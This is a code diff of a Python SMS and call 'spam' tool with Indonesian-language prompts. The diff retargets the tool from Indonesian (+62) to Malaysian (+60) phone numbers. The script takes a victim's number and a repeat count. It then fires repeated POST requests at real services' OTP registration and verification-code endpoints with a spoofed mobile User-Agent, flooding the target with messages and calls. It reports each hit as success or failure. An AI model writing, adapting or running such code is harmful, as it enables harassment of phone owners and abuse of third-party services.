@@ -13,7 +13,7 @@ def gagal(no1,pro,nam):
   print "     %s[%s%s%s] [%s Failed  %s] %sFailed, spam %s from %s%s %snot sended"%(pu,ku,no1,pu,me,pu,pu,pro,ku,nam,me)
 #--------------------------------MAIN---------------------------------------------------
 def main():
-  print "%s[%s!%s] %sTarget locked >> %s%s"%(pu,me,pu,pu,ku,"+62"+nom)
+  print "%s[%s!%s] %sTarget locked >> %s%s"%(pu,me,pu,pu,ku,"+60"+nom)
   t = 1
   for spam in range(jum):
    print "%s[%s+%s]-------------------------->>>[%s%s%s]<<<--------------------------[%s+%s]"%(pu,ku,pu,me,t,pu,ku,pu)
@@ -35,7 +35,7 @@ def input():
     print "%s[%s!%s] %sMasukkan nomor target dengan benar!!"%(pu,me,pu,me)
     input()
   elif nom.startswith(tuple(["62","+62","0"])):
-    print "%s[%s!%s] %sMasukkan nomor tanpa 62, +62, ataupun 0\n%s[%s!%s] %sContoh : 85877162199"%(pu,me,pu,ku,pu,me,pu,ku)
+    print "%s[%s!%s] %sMasukkan nomor tanpa 60, +60, ataupun 0\n%s[%s!%s] %sContoh : 0192348066"%(pu,me,pu,ku,pu,me,pu,ku)
     input()
   else:
     global jum
@@ -43,7 +43,7 @@ def input():
     main()
 #-------------------------------SPAM Function-------------------------------------------
 def asakita():
-  data={'username':'62'+nom}
+  data={'username':'60'+nom}
   h = requests.post("https://www.asakita.id/api/auth/register/otp",headers={'User-Agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'},data=data).text
   if 'MOBILE' in h:
    sukses("1","sms","asakita")
@@ -68,7 +68,7 @@ def asani():
   else:
    gagal("4","sms","asani")
 def wintershop():
- dat=json.dumps(["62"+nom,"Winter Shop","",""])
+ dat=json.dumps(["60"+nom,"Winter Shop","",""])
  tes = requests.post("https://api.winter-api.com/account/sendmobilecodeasync.json",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data=dat)
  if json.loads(tes.text)["message"] == None:
   sukses("5","call","wintershop")
